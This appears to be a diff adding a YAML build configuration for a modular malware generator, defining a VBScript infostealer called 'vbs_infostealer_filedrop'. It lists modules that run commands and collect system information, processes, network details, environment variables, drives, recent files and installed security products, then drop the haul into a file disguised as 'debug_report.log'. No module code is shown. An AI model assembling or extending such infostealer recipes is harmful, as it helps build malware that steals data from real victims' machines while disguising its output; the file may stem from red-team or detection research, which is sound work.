@@ -1,0 +1,25 @@
+name: vbs_infostealer_filedrop
+description: VBScript infostealer with local file drop exfil
+format: vbscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/network
+  - collectors/env_vars
+  - collectors/drives
+  - collectors/recent_files
+  - collectors/security_products
+
+exfil: exfil/file_drop
+arch: arch/sequential
+
+evasion: []
+
+vars:
+  EXFIL_FILENAME: "debug_report.log"
